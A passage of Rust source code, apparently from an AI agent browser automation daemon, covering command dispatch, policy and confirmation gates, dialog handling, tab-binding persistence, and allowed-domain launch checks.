    // command too. Launch settings wait until the launch itself: a command that
    // is denied or needs confirmation leaves the browser and its settings alone.
    let launches = command_launches_browser(cmd);
    let mut launch_patch: Option<Patch> = None;
    let mut settings_outcome = if action == "close" {
        SettingsOutcome::default()
    } else {
        let patch = match Patch::from_wire(cmd.get("settings")) {
            Ok(patch) => patch,
            Err(e) => return error_response(&id, &e.to_string()),
        };
        if let Err(e) = check_capture_setting(&patch) {
            return error_response(&id, &e);
        }
        let outcome = match apply_settings_patch(state, &patch, false).await {
            Ok(outcome) => outcome,
            Err(e) => return error_response(&id, &e),
        };
        if launches {
            let mut patch = patch;
            if let Err(e) = adjust_ca_patch(state, &mut patch) {
                return error_response(&id, &e);
            }
            launch_patch = Some(patch);
        }
        outcome
    };
    // The settings the browser will be launched with, when the patch changes them.
    let launch_plan = launch_patch
        .as_ref()
        .map(|patch| state.settings.plan(patch))
        .filter(|plan| plan.relaunch);

    let skip_launch = skip_launch_action(action);
    let restore_key_change_needs_launch = !skip_launch
        && command_changes_restore_key(cmd, state)
        && has_active_browser_session(state);
    let needs_launch = if !skip_launch && !auth_login_no_navigate {
        // Check if existing connection is stale and needs re-launch.
        // This must happen before policy evaluation so plugin capability
        // actions are gated when recovery relaunches would invoke plugins.
        if restore_key_change_needs_launch || launch_plan.is_some() {
            true
        } else if let Some(ref mut mgr) = state.browser {
            mgr.has_process_exited() || !mgr.is_connection_alive().await
        } else {
            state.webdriver_backend.is_none()
        }
    } else {
        false
    };
    let mut lifecycle_reused = false;
    let mut lifecycle_launched = false;
    let mut lifecycle_relaunched_browser = false;
    // The flow is read once per command: policy, confirmation and the run all
    // see the same file.
    let mut run_flow = match load_run_flow(cmd, action, state) {
        Ok(flow) => flow,
        Err(e) => return error_response(&id, &e),
    };
    // A launch that changes where the session connects no longer resumes the
    // browser it was attached to, so that attachment does not decide its policy.
    let switches_connection = launch_plan.as_ref().is_some_and(|plan| {
        plan.changes.iter().any(|change| {
            matches!(
                change.key,
                Key::Cdp | Key::AutoConnect | Key::Provider | Key::CdpHeaders
            )
        })
    });
    let policy_actions = policy_actions_for_command(
        cmd,
        action,
        needs_launch,
        state
            .attached_target
            .as_ref()
            .filter(|_| !switches_connection),
        run_flow.as_deref(),
        launch_plan
            .as_ref()
            .map_or(&state.settings, |plan| &plan.next),
    );

    // Hot-reload and check action policy
    if let Some(ref mut policy) = state.policy {
        policy.reload();
        let mut confirmation_required: Option<String> = None;
        for policy_action in &policy_actions {
            match policy.check(policy_action) {
                PolicyResult::Allow => {}
                PolicyResult::Deny(reason) => {
                    let mut resp = error_response(
                        &id,
                        &format!("Action '{}' denied by policy: {}", policy_action, reason),
                    );
                    attach_settings_outcome(&mut resp, &settings_outcome);
                    return resp;
                }
                PolicyResult::RequiresConfirmation => {
                    if !state.confirmed_policy_actions.contains(policy_action)
                        && confirmation_required.is_none()
                    {
                        confirmation_required = Some(policy_action.to_string());
                    }
                }
            }
        }
        if let Some(policy_action) = confirmation_required {
            state.pending_confirmation = Some(PendingConfirmation {
                action: policy_action.clone(),
                cmd: cmd.clone(),
                approved_actions: state.confirmed_policy_actions.iter().cloned().collect(),
                flow: run_flow.clone(),
            });
            let mut resp = json!({
                "id": id,
                "success": true,
                "data": {
                    "confirmation_required": true,
                    "confirmation_id": id,
                    "action": policy_action
                },
            });
            attach_settings_outcome(&mut resp, &settings_outcome);
            return resp;
        }
    }

    // Check AGENT_BROWSER_CONFIRM_ACTIONS (category-based, independent of policy file)
    if action != "confirm" && action != "deny" {
        if let Some(ref ca) = state.confirm_actions {
            for policy_action in &policy_actions {
                if state.confirmed_policy_actions.contains(policy_action) {
                    continue;
                }
                if ca.requires_confirmation(policy_action) {
                    state.pending_confirmation = Some(PendingConfirmation {
                        action: policy_action.to_string(),
                        cmd: cmd.clone(),
                        approved_actions: state.confirmed_policy_actions.iter().cloned().collect(),
                        flow: run_flow.clone(),
                    });
                    let mut resp = json!({
                        "id": id,
                        "success": true,
                        "data": {
                            "confirmation_required": true,
                            "confirmation_id": id,
                            "action": policy_action,
                        },
                    });
                    attach_settings_outcome(&mut resp, &settings_outcome);
                    return resp;
                }
            }
        }
    }

    // A write `--allow-write` does not cover needs an explicit confirmation,
    // whatever the policy file and --confirm-actions say.
    if let Some(resp) = park_unconfirmed_flow_write(&id, cmd, action, run_flow.as_deref(), state) {
        return resp;
    }

    let restore_transition_closed_browser = match async {
        if auth_login_no_navigate && command_changes_restore_key(cmd, state) {
            return Err(
                "auth login --no-navigate cannot switch restore sessions; select the session containing the active login page"
                    .to_string(),
            );
        }
        apply_restore_config_after_confirmation(cmd, state).await
    }
    .await
    {
        Ok(closed_browser) => closed_browser,
        Err(err) => {
            let mut resp = error_response(&id, &err);
            attach_settings_outcome(&mut resp, &settings_outcome);
            return resp;
        }
    };

    if !skip_launch {
        if needs_launch {
            // Past the policy gates: the launch settings take effect now.
            if let (Some(patch), Some(_)) = (launch_patch.as_ref(), launch_plan.as_ref()) {
                match apply_settings_patch(state, patch, true).await {
                    Ok(outcome) => settings_outcome.absorb(outcome),
                    Err(e) => {
                        let mut resp = error_response(&id, &e);
                        attach_settings_outcome(&mut resp, &settings_outcome);
                        return resp;
                    }
                }
            }
            lifecycle_relaunched_browser |= settings_outcome.relaunched_browser;
            lifecycle_relaunched_browser |= restore_transition_closed_browser
                || state.browser.is_some()
                || state.active_provider_session.is_some();
            if state.browser.is_some() || state.active_provider_session.is_some() {
                let _ = auto_save_restore_state(state).await;
            }
            let strict_state = launch_patch
                .as_ref()
                .is_some_and(|patch| patch.value(Key::StorageState).is_some());
            let launched = auto_launch_with(
                state,
                plugins_from_command_or_env(cmd),
                &Value::Null,
                strict_state,
            )
            .await;
            let launched = match launched {
                Ok(_) => Box::pin(start_flow_capture(state)).await,
                Err(e) => Err(e),
            };
            if let Err(e) = launched {
                let context = auto_launch_error_context(matches!(
                    state.settings.connection(),
                    Connection::Cdp(_)
                ));
                let rollback = rollback_launch_settings(state, &mut settings_outcome, &e).await;
                let e = with_rollback_error(&e, rollback);
                let mut resp = error_response(&id, &format!("{}: {}", context, e));
                attach_settings_outcome(&mut resp, &settings_outcome);
                return resp;
            }
            state.webmcp_enabled = state.settings.webmcp();
            lifecycle_launched = true;
        } else {
            lifecycle_reused = true;
        }

        if !auth_login_no_navigate {
            if let Some(ref mut mgr) = state.browser {
                if mgr.page_count() == 0 {
                    // ensure_page itself skips creation for a pinned tab_gone
                    // session, so a closed sole tab stays tab_gone instead of
                    // silently recovering onto a fresh blank page.
                    let _ = mgr.ensure_page().await;
                }
            }
        }
    }

    // WebDriver backend: reject unsupported CDP-only actions
    if matches!(state.backend_type, BackendType::WebDriver)
        && WEBDRIVER_UNSUPPORTED_ACTIONS.contains(&action)
    {
        let mut resp = error_response(
            &id,
            &format!(
                "Action '{}' is not supported on the WebDriver backend",
                action
            ),
        );
        // The launch above may have run; report what it applied.
        attach_settings_outcome(&mut resp, &settings_outcome);
        return resp;
    }

    // A pending confirm/prompt dialog blocks the renderer's main thread, so
    // any command that touches the page would hang until the client read
    // timeout. Fail fast with instructions instead. Actions in skip_launch
    // never touch the page; dialog/screenshot/url/title are browser-side.
    // Only a dialog on the ACTIVE tab blocks: one on a background tab leaves
    // the active tab's renderer responsive.
    if let Some(ref dialog) = state.pending_dialog {
        let active_session = state
            .browser
            .as_ref()
            .and_then(|m| m.active_session_id().ok().map(|s| s.to_string()));
        let on_active_tab = match (&dialog.session_id, &active_session) {
            (Some(dialog_sid), Some(active_sid)) => dialog_sid == active_sid,
            // No session on the event = top-level page dialog; no browser = be safe.
            _ => true,
        };
        // Tab and session management must stay usable: switching or closing
        // tabs is exactly how an agent escapes a tab blocked by a dialog.
        let read_touches_active_tab = action == "read"
            && cmd.get("url").is_none()
            && cmd.get("llms").is_none()
            && !cmd
                .get("requireMd")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
        let safe_during_dialog = (skip_launch && !read_touches_active_tab)
            || matches!(
                action,
                "dialog"
                    | "screenshot"
                    | "url"
                    | "title"
                    | "tab_list"
                    | "tab_new"
                    | "tab_switch"
                    | "tab_close"
            );
        if on_active_tab && !safe_during_dialog {
            let mut resp = error_response(
                &id,
                &format!(
                    "A JavaScript {} dialog is blocking the page: \"{}\". Resolve it with `dialog accept` or `dialog dismiss`, then retry `{}`.",
                    dialog.dialog_type, dialog.message, action
                ),
            );
            attach_settings_outcome(&mut resp, &settings_outcome);
            return resp;
        }
    }

    let mut result = match action {
        "launch" => {
            let applied = match launch_patch.as_ref() {
                Some(patch) => apply_settings_patch(state, patch, true)
                    .await
                    .map(|outcome| settings_outcome.absorb(outcome)),
                None => Ok(()),
            };
            lifecycle_relaunched_browser |= settings_outcome.relaunched_browser;
            let result = match applied {
                Ok(()) => handle_launch(cmd, state).await,
                Err(e) => Err(e),
            };
            match result {
                Ok(data) => {
                    state.webmcp_enabled = state.settings.webmcp();
                    Ok(data)
                }
                Err(e) => {
                    let rollback = rollback_launch_settings(state, &mut settings_outcome, &e).await;
                    Err(with_rollback_error(&e, rollback))
                }
            }
        }
        "navigate" => handle_navigate(cmd, state).await,
        "read" => handle_read(cmd, state).await,
        "url" => handle_url(state).await,
        "cdp_url" => handle_cdp_url(state).await,
        "inspect" => handle_inspect(state).await,
        "title" => handle_title(state).await,
        "content" => handle_content(state).await,
        "evaluate" => handle_evaluate(cmd, state).await,
        "close" => handle_close(state).await,
        "snapshot" => handle_snapshot(cmd, state).await,
        "screenshot" => handle_screenshot(cmd, state).await,
        "click" => handle_click(cmd, state).await,
        "dblclick" => handle_dblclick(cmd, state).await,
        "fill" => handle_fill(cmd, state).await,
        "type" => handle_type(cmd, state).await,
        "press" => handle_press(cmd, state).await,
        "hover" => handle_hover(cmd, state).await,
        "scroll" => handle_scroll(cmd, state).await,
        "select" => handle_select(cmd, state).await,
        "check" => handle_check(cmd, state).await,
        "uncheck" => handle_uncheck(cmd, state).await,
        "wait" => handle_wait(cmd, state).await,
        "gettext" => handle_gettext(cmd, state).await,
        "getattribute" => handle_getattribute(cmd, state).await,
        "isvisible" => handle_isvisible(cmd, state).await,
        "isenabled" => handle_isenabled(cmd, state).await,
        "ischecked" => handle_ischecked(cmd, state).await,
        "back" => handle_back(state).await,
        "forward" => handle_forward(state).await,
        "reload" => handle_reload(state).await,
        "cookies_get" => handle_cookies_get(cmd, state).await,
        "cookies_set" => handle_cookies_set(cmd, state).await,
        "cookies_clear" => handle_cookies_clear(state).await,
        "storage_get" => handle_storage_get(cmd, state).await,
        "storage_set" => handle_storage_set(cmd, state).await,
        "storage_clear" => handle_storage_clear(cmd, state).await,
        "setcontent" => handle_setcontent(cmd, state).await,
        "headers" => handle_headers(cmd, state).await,
        "offline" => handle_offline(cmd, state).await,
        "console" => handle_console(cmd, state).await,
        "errors" => handle_errors(cmd, state).await,
        "session_info" => handle_session_info(state).await,
        "state_save" => handle_state_save(cmd, state).await,
        "state_load" => handle_state_load(cmd, state).await,
        "state_list" | "state_show" | "state_clear" | "state_clean" | "state_rename" => {
            state::dispatch_state_command(cmd)
                .expect("dispatch_state_command must handle all state_* actions matched here")
        }
        "trace_start" => handle_trace_start(state).await,
        "trace_stop" => handle_trace_stop(cmd, state).await,
        "profiler_start" => handle_profiler_start(cmd, state).await,
        "profiler_stop" => handle_profiler_stop(cmd, state).await,
        "recording_start" => handle_recording_start(cmd, state).await,
        "recording_stop" => handle_recording_stop(state).await,
        "recording_restart" => handle_recording_restart(cmd, state).await,
        "pdf" => handle_pdf(cmd, state).await,
        "tab_list" => handle_tab_list(state).await,
        "tab_new" => handle_tab_new(cmd, state).await,
        "tab_switch" => handle_tab_switch(cmd, state).await,
        "tab_close" => handle_tab_close(cmd, state).await,
        "viewport" => handle_viewport(cmd, state).await,
        "useragent" | "user_agent" => handle_user_agent(cmd, state).await,
        "set_media" => handle_set_media(cmd, state).await,
        "download" => handle_download(cmd, state).await,
        "diff_snapshot" => handle_diff_snapshot(cmd, state).await,
        "diff_url" => handle_diff_url(cmd, state).await,
        "credentials_set" => handle_credentials_set(cmd).await,
        "credentials_get" => handle_credentials_get(cmd).await,
        "credentials_delete" => handle_credentials_delete(cmd).await,
        "credentials_list" => handle_credentials_list().await,
        "mouse" => handle_mouse(cmd, state).await,
        "keyboard" => handle_keyboard(cmd, state).await,
        "focus" => handle_focus(cmd, state).await,
        "clear" => handle_clear(cmd, state).await,
        "selectall" => handle_selectall(cmd, state).await,
        "scrollintoview" => handle_scrollintoview(cmd, state).await,
        "dispatch" => handle_dispatch(cmd, state).await,
        "highlight" => handle_highlight(cmd, state).await,
        "tap" => handle_tap(cmd, state).await,
        "boundingbox" => handle_boundingbox(cmd, state).await,
        "innertext" => handle_innertext(cmd, state).await,
        "innerhtml" => handle_innerhtml(cmd, state).await,
        "inputvalue" => handle_inputvalue(cmd, state).await,
        "setvalue" => handle_setvalue(cmd, state).await,
        "count" => handle_count(cmd, state).await,
        "styles" => handle_styles(cmd, state).await,
        "bringtofront" => handle_bringtofront(state).await,
        "timezone" => handle_timezone(cmd, state).await,
        "locale" => handle_locale(cmd, state).await,
        "geolocation" => handle_geolocation(cmd, state).await,
        "permissions" => handle_permissions(cmd, state).await,
        "dialog" => handle_dialog(cmd, state).await,
        "upload" => handle_upload(cmd, state).await,
        "addscript" => handle_addscript(cmd, state).await,
        "addinitscript" => handle_addinitscript(cmd, state).await,
        "removeinitscript" => handle_removeinitscript(cmd, state).await,
        "addstyle" => handle_addstyle(cmd, state).await,
        "react_tree" => handle_react_tree(cmd, state).await,
        "react_inspect" => handle_react_inspect(cmd, state).await,
        "react_renders_start" => handle_react_renders_start(cmd, state).await,
        "react_renders_stop" => handle_react_renders_stop(cmd, state).await,
        "react_suspense" => handle_react_suspense(cmd, state).await,
        "vitals" => handle_vitals(cmd, state).await,
        "a11y" => handle_a11y(cmd, state).await,
        "pushstate" => handle_pushstate(cmd, state).await,
        "clipboard" => handle_clipboard(cmd, state).await,
        "wheel" => handle_wheel(cmd, state).await,
        "device" => handle_device(cmd, state).await,
        "screencast_start" => handle_screencast_start(cmd, state).await,
        "screencast_stop" => handle_screencast_stop(state).await,
        "stream_enable" => handle_stream_enable(cmd, state).await,
        "stream_disable" => handle_stream_disable(state).await,
        "stream_status" => handle_stream_status(state).await,
        "webmcp_list" => handle_webmcp_list(cmd, state).await,
        "webmcp_invoke" => handle_webmcp_invoke(cmd, state).await,
        "webmcp_result" => handle_webmcp_result(cmd, state).await,
        "webmcp_cancel" => handle_webmcp_cancel(cmd, state).await,
        "waitforurl" => handle_waitforurl(cmd, state).await,
        "waitforloadstate" => handle_waitforloadstate(cmd, state).await,
        "waitforfunction" => handle_waitforfunction(cmd, state).await,
        "frame" => handle_frame(cmd, state).await,
        "mainframe" => handle_mainframe(state).await,
        "getbyrole" => handle_getbyrole(cmd, state).await,
        "getbytext" => handle_getbytext(cmd, state).await,
        "getbylabel" => handle_getbylabel(cmd, state).await,
        "getbyplaceholder" => handle_getbyplaceholder(cmd, state).await,
        "getbyalttext" => handle_getbyalttext(cmd, state).await,
        "getbytitle" => handle_getbytitle(cmd, state).await,
        "getbytestid" => handle_getbytestid(cmd, state).await,
        "nth" => handle_nth(cmd, state).await,
        "find" => handle_find(cmd, state).await,
        "evalhandle" => handle_evalhandle(cmd, state).await,
        "drag" => handle_drag(cmd, state).await,
        "expose" => handle_expose(cmd, state).await,
        "pause" => handle_pause(state).await,
        "multiselect" => handle_multiselect(cmd, state).await,
        "responsebody" => handle_responsebody(cmd, state).await,
        "waitfordownload" => handle_waitfordownload(cmd, state).await,
        "window_new" => handle_window_new(cmd, state).await,
        "diff_screenshot" => handle_diff_screenshot(cmd, state).await,
        "video_start" => handle_video_start(cmd, state).await,
        "video_stop" => handle_video_stop(state).await,
        "flow_steps" | "flow_save" | "flow_run" | "flow_list" => {
            handle_flow_command(action, cmd, state, run_flow.take()).await
        }
        "har_start" => handle_har_start(cmd, state).await,
        "har_stop" => handle_har_stop(cmd, state).await,
        "route" => handle_route(cmd, state).await,
        "unroute" => handle_unroute(cmd, state).await,
        "requests" => handle_requests(cmd, state).await,
        "request_detail" => handle_request_detail(cmd, state).await,
        "credentials" => handle_http_credentials(cmd, state).await,
        "emulatemedia" => handle_set_media(cmd, state).await,
        "auth_save" => handle_auth_save(cmd).await,
        "auth_login" => handle_auth_login(cmd, state).await,
        "auth_list" => handle_credentials_list().await,
        "auth_delete" => handle_credentials_delete(cmd).await,
        "auth_show" => handle_auth_show(cmd).await,
        "confirm" => handle_confirm(cmd, state).await,
        "deny" => handle_deny(cmd, state).await,
        "swipe" => handle_swipe(cmd, state).await,
        "device_list" => handle_device_list().await,
        "input_mouse" => handle_input_mouse(cmd, state).await,
        "input_keyboard" => handle_input_keyboard(cmd, state).await,
        "input_touch" => handle_input_touch(cmd, state).await,
        "keydown" => handle_keydown(cmd, state).await,
        "keyup" => handle_keyup(cmd, state).await,
        "inserttext" => handle_inserttext(cmd, state).await,
        "mousemove" => handle_mousemove(cmd, state).await,
        "mousedown" => handle_mousedown(cmd, state).await,
        "mouseup" => handle_mouseup(cmd, state).await,
        _ => Err(format!("Not yet implemented: {}", action)),
    };

    if result.is_ok() && should_validate_restore_after_action(action) {
        validate_restore_if_pending(state).await;
    }

    // Stamp browser-touching commands so periodic autosave waits for an
    // active command burst to settle before collecting state. Stamped even on
    // error: a failed click can still have navigated.
    if !skip_launch {
        state.last_command_finished = Some(std::time::Instant::now());
    }

    let mut wedge = None;
    if result.is_ok() {
        if let Some(mgr) = state.browser.as_mut() {
            mgr.clear_wedge_suspect_if_responsive().await;
        }
    }
    if let Err(ref e) = result {
        if e.contains("CDP command timed out") {
            // A dialog opened by this command blocks the renderer like a
            // wedge does; its event is only seen once events are drained.
            let _ = state.drain_cdp_events_background().await;
            let dialog_session = state
                .pending_dialog
                .as_ref()
                .and_then(|d| d.session_id.clone());
            let may_replace = may_replace_wedged_tab(state);
            if let Some(mgr) = state.browser.as_mut() {
                wedge = mgr
                    .handle_command_timeout(dialog_session.as_deref(), may_replace)
                    .await;
            }
            if let Some(old_session_id) = wedge
                .as_ref()
                .filter(|w| w.replacement_target_id.is_some())
                .map(|w| w.session_id.clone())
            {
                if let Err(e) = adopt_replacement_tab(state, &old_session_id).await {
                    result = Err(e);
                    wedge = None;
                }
            }
        }
    }

    // Persist the session-to-tab binding (write-on-change) so a fresh daemon
    // re-attaches to this session's tab instead of adopting the browser's
    // most recently active one.
    let persist_error = if !skip_launch {
        maybe_persist_tab_binding(state)
    } else {
        None
    };

    let mut resp = match (result, &wedge) {
        (_, Some(report)) => {
            let mut resp = error_response(&id, &report.error_message());
            resp["data"] = report.data();
            resp
        }
        (Ok(data), None) => success_response(&id, data),
        (Err(e), None) => error_response(&id, &super::browser::to_ai_friendly_error(&e)),
    };
    attach_tab_gone_data(&mut resp, state);
    attach_flow_stop(&mut resp, state);
    if resp.get("success").and_then(Value::as_bool) == Some(false) {
        attach_settings_outcome(&mut resp, &settings_outcome);
    }
    if let Some(report) = wedge {
        state.undelivered_wedge = Some((id.clone(), report));
    } else if let Some((_, report)) = state.undelivered_wedge.take() {
        // The wedged command's response never reached the client.
        append_warning(&mut resp, &report.error_message());
    }

    // A failed binding write is retried on the next command, but a pinned
    // session must know its isolation may not survive a daemon restart.
    if let Some(err) = persist_error {
        let hint = if state.pin_tab {
            " --pin-tab isolation may not survive a daemon restart until the binding persists."
        } else {
            ""
        };
        append_warning(
            &mut resp,
            &format!(
                "Failed to persist the session tab binding: {}.{}",
                err, hint
            ),
        );
    }
    inject_lifecycle(
        &mut resp,
        state,
        lifecycle_reused,
        lifecycle_launched,
        lifecycle_relaunched_browser,
    );
    attach_settings_outcome(&mut resp, &settings_outcome);

    // Re-drain so a dialog opened by THIS command is reflected in the warning
    // below; events are otherwise only drained at the start of a command.
    if let Err(e) = state.drain_cdp_events_background().await {
        resp = error_response(&id, &super::browser::to_ai_friendly_error(&e));
        attach_tab_gone_data(&mut resp, state);
        inject_lifecycle(
            &mut resp,
            state,
            lifecycle_reused,
            lifecycle_launched,
            lifecycle_relaunched_browser,
        );
        attach_settings_outcome(&mut resp, &settings_outcome);
    }
    attach_webmcp_availability(&mut resp, action, state).await;
    attach_flow_availability(&mut resp, action, state).await;

    // Auto-report pending JavaScript dialog so agents know why commands may hang
    if action != "dialog" {
        if let Some(ref dialog) = state.pending_dialog {
            append_warning(
                &mut resp,
                &format!(
                    "A JavaScript {} dialog is blocking the page: \"{}\" — use `dialog accept` or `dialog dismiss` to resolve it",
                    dialog.dialog_type, dialog.message
                ),
            );
        }
    }

    if let Some(ref server) = state.stream_server {
        let duration_ms = cmd_start.elapsed().as_millis() as u64;
        let success = resp
            .get("status")
            .and_then(|v| v.as_str())
            .is_some_and(|s| s == "success");
        let data = resp.get("data").cloned().unwrap_or(Value::Null);
        server.broadcast_result(&id, action, success, &data, duration_ms);

        if let Some(ref mgr) = state.browser {
            let tabs = mgr.tab_list();
            let session_id = mgr.active_session_id().ok().map(|s| s.to_string());
            server
                .bind_cdp_session_and_broadcast_tabs(session_id, &tabs)
                .await;
        }
    }

    resp
}

fn auto_launch_error_context(has_cdp: bool) -> &'static str {
    if has_cdp {
        "CDP connection failed"
    } else {
        "Auto-launch failed"
    }
}

// ---------------------------------------------------------------------------
// Session-to-tab binding
// ---------------------------------------------------------------------------

/// Persist the session's tab binding when it changed. Called after every
/// browser-touching command; skipped while the bound tab is gone so the
/// stale binding (needed to re-derive the tab_gone state after a daemon
/// restart) is not overwritten by the fallback tab.
///
/// Returns the write error, if any. `last_persisted_binding` is only updated
/// after a successful durable write, so a transient failure is retried on
/// the next command instead of being silently treated as persisted (which
/// would let a daemon restart drop the binding and, for a pinned session,
/// the strict isolation boundary with it).
fn maybe_persist_tab_binding(state: &mut DaemonState) -> Option<String> {
    let mgr = state.browser.as_ref()?;
    let (target_id, url) = mgr.binding_snapshot()?;
    let binding = tab_binding::TabBinding {
        target_id,
        url: tab_binding::sanitize_url(&url),
        pinned: state.pin_tab,
    };
    if state.last_persisted_binding.as_ref() == Some(&binding) {
        return None;
    }
    match tab_binding::save(&state.session_id, &binding) {
        Ok(()) => {
            state.last_persisted_binding = Some(binding);
            None
        }
        Err(e) => Some(e),
    }
}

/// Re-apply this session's persisted tab binding after attaching to a
/// browser over CDP, instead of keeping the default selection (the first
/// target returned by `Target.getTargets`, i.e. the browser's most recently
/// active tab, which in a shared browser is usually another session's tab).
///
/// Returns true when the session ends up with an established selection:
/// re-bound to the persisted target, entered the `tab_gone` state (pin-tab,
/// bound tab dead), or bound to a fresh tab (pin-tab, no prior binding).
/// Returns false when no binding existed and the legacy selection stands.
async fn apply_tab_binding_on_attach(state: &mut DaemonState) -> Result<bool, String> {
    let session = state.session_id.clone();
    // A corrupt or unreadable binding file is a recovery error, not a
    // first-time session: it may have carried pinned=true, and silently
    // starting fresh would drop the strict isolation boundary.
    let binding = tab_binding::load(&session).map_err(|e| {
        format!(
            "{} — delete the file to reset the session's tab binding \
             (re-run with --pin-tab afterwards if the session was pinned)",
            e
        )
    })?;
    if binding.as_ref().is_some_and(|b| b.pinned) {
        state.pin_tab = true;
    }
    let pin = state.pin_tab;
    if state.browser.is_none() {
        return Ok(false);
    }
    if let Some(ref mut mgr) = state.browser {
        mgr.set_pin_tab(pin);
    }
    let established = match binding {
        Some(b) => {
            let restored = state
                .browser
                .as_mut()
                .map(|mgr| mgr.restore_target_binding(&b.target_id, &b.url))
                .unwrap_or(false);
            if restored {
                // Attach only enables the CDP domains on the first target; the
                // restored tab needs them too (like tab_switch), or
                // lifecycle-dependent commands such as navigate hang. The tab
                // may have been discarded by Memory Saver, so revive it before
                // enabling domains instead of hanging on Page.enable.
                if let Some(ref mgr) = state.browser {
                    mgr.revive_and_enable_active().await?;
                }
            }
            if restored || pin {
                // Restored, or entered the tab_gone state (the stale binding
                // file is intentionally kept so the state is re-derived if
                // the daemon restarts again before the agent re-binds).
                true
            } else {
                // Legacy sessions fall back to the first target; drop the
                // stale binding.
                tab_binding::clear(&session);
                state.last_persisted_binding = None;
                false
            }
        }
        None => {
            if pin {
                // A pinned session never implicitly adopts an existing tab:
                // start it on a fresh one.
                if let Some(ref mut mgr) = state.browser {
                    mgr.tab_new(None, None).await?;
                }
                true
            } else {
                false
            }
        }
    };
    if established {
        if let Some(err) = maybe_persist_tab_binding(state) {
            // Strict pinning is only as durable as the binding file: fail
            // the attach instead of pretending the pin is in place.
            if state.pin_tab {
                return Err(format!(
                    "cannot persist the pinned tab binding: {} — \
                     --pin-tab requires a writable socket directory",
                    err
                ));
            }
        }
    }
    Ok(established)
}

/// Run `apply_tab_binding_on_attach`, but tear the connection down on failure.
/// The attach paths set `state.browser` before calling this; without the
/// rollback a binding-recovery error would leave a live but un-recovered
/// browser, and the next command would skip the attach path and act on the
/// wrong tab.
async fn apply_tab_binding_on_attach_or_rollback(state: &mut DaemonState) -> Result<bool, String> {
    match apply_tab_binding_on_attach(state).await {
        Ok(v) => Ok(v),
        Err(e) => {
            let _ = rollback_failed_launch(state).await;
            Err(e)
        }
    }
}

// ---------------------------------------------------------------------------
// Auto-launch
// ---------------------------------------------------------------------------

/// Open a fresh tab so auto-connect navigations don't hijack the user's
/// existing tabs. Used when no persisted binding re-established a tab.
async fn open_fresh_tab_for_auto_connect(state: &mut DaemonState) -> Result<(), String> {
    let Some(ref mut mgr) = state.browser else {
        return Ok(());
    };
    mgr.tab_new(None, None).await?;
    let session_id = mgr.active_session_id()?.to_string();
    let _ = mgr
        .client
        .send_command("Page.bringToFront", None, Some(&session_id))
        .await;
    // Best effort: a failed write is retried after the next command.
    let _ = maybe_persist_tab_binding(state);
    Ok(())
}

async fn current_allowed_domains(state: &DaemonState) -> Vec<String> {
    state
        .domain_filter
        .read()
        .await
        .as_ref()
        .map(|filter| filter.allowed_domains.clone())
        .unwrap_or_default()
}

fn network_control_session_ids_from_pages(
    pages: &[super::browser::PageInfo],
    active_session_id: Option<&str>,
) -> Result<Vec<String>, String> {
    let mut session_ids: Vec<String> = Vec::new();
    for page in pages {
        if !session_ids.iter().any(|sid| sid == &page.session_id) {
            session_ids.push(page.session_id.clone());
        }
    }

    if session_ids.is_empty() {
        let active = active_session_id.ok_or("No active page")?;
        session_ids.push(active.to_string());
    }

    Ok(session_ids)
}

fn network_control_session_ids(mgr: &BrowserManager) -> Result<Vec<String>, String> {
    let pages = mgr.pages_list();
    let active_session_id = if pages.is_empty() {
        Some(mgr.active_session_id()?)
    } else {
        None
    };
    network_control_session_ids_from_pages(&pages, active_session_id)
}

fn should_blank_existing_url(url: &str, filter: &DomainFilter) -> bool {
    if url.is_empty() || url == "about:blank" {
        return false;
    }
    url::Url::parse(url)
        .ok()
        .and_then(|parsed| {
            parsed
                .host_str()
                .map(|hostname| !filter.is_allowed(hostname))
        })
        .unwrap_or(false)
}

fn check_url_allowed_by_filter(filter: Option<&DomainFilter>, url: &str) -> Result<(), String> {
    if let Some(filter) = filter {
        if url != "about:blank" {
            filter.check_url(url)?;
        }
    }
    Ok(())
}

fn network_controls_required(filter: Option<&DomainFilter>, handle_auth_requests: bool) -> bool {
    filter.is_some() || handle_auth_requests
}

fn should_defer_url_until_network_controls(
    filter: Option<&DomainFilter>,
    handle_auth_requests: bool,
    url: Option<&str>,
) -> Result<bool, String> {
    let Some(url) = url else {
        return Ok(false);
    };

    check_url_allowed_by_filter(filter, url)?;
    Ok(filter.is_some_and(|filter| !filter.allowed_domains.is_empty()) || handle_auth_requests)
}

struct AllowedDomainsLaunchSupport<'a> {
    allowed_domains: &'a [String],
    cdp_url: Option<&'a str>,
    cdp_port: Option<u64>,
    auto_connect: bool,
    profile: Option<&'a str>,
    provider_name: Option<&'a str>,
    args: &'a [String],
    restore_key: Option<&'a str>,
    storage_state: Option<&'a str>,
}

fn ensure_allowed_domains_supported_for_launch(
    support: AllowedDomainsLaunchSupport<'_>,
) -> Result<(), String> {
    if support.allowed_domains.is_empty() {
        return Ok(());
    }

    if support
        .restore_key
        .is_some_and(|key| !key.trim().is_empty())
    {
        return Err(
            "--allowed-domains is not supported with --restore because saved state can replay origins before agent-browser can verify they are in the allowlist"
                .to_string(),
        );
    }

    if support
        .storage_state
        .is_some_and(|path| !path.trim().is_empty())
    {
        return Err(
            "--allowed-domains is not supported with --state/storageState because loading state replays saved origins"
                .to_string(),
        );
    }

    if support.cdp_url.is_some() || support.cdp_port.is_some() {
        return Err(
            "--allowed-domains is not supported with --cdp because WebRTC containment cannot be installed before existing page scripts run"
                .to_string(),
        );
    }

    if support.auto_connect {
        return Err(
            "--allowed-domains is not supported with --auto-connect because WebRTC containment cannot be installed before existing page scripts run"
                .to_string(),
        );
    }

    if support.profile.is_some() {
        return Err(
            "--allowed-domains is not supported with --profile because Chrome may restore existing pages before network containment is installed"
                .to_string(),
        );
    }

    if let Some(provider) = support.provider_name {
        match provider.to_lowercase().as_str() {
            "ios" => {
                return Err(
                    "--allowed-domains is not supported with the iOS provider because WebRTC containment cannot be enforced"
                        .to_string(),
                );
            }
            "safari" => {
                return Err(
                    "--allowed-domains is not supported with the Safari provider because WebRTC containment cannot be enforced"
                        .to_string(),
                );
            }
            _ => {}
        }
    }

    if let Some(arg) = allowed_domains_disallowed_chrome_arg(support.args) {
        return Err(format!(
            "--allowed-domains is not supported with --args containing {} because Chrome may restore or open pages before network containment is installed",
            arg
        ));
    }

    Ok(())
}

fn direct_page_allowed_domains_error() -> String {
    "--allowed-domains is not supported with direct-page browser providers because worker and popup containment require browser-level Target auto-attach"
        .to_string()
}

async fn ensure_state_replay_supported_by_active_domain_filter(
    state: &DaemonState,
    source: &str,
) -> Result<(), String> {
    let filter = state.domain_filter.read().await;
    if filter
        .as_ref()
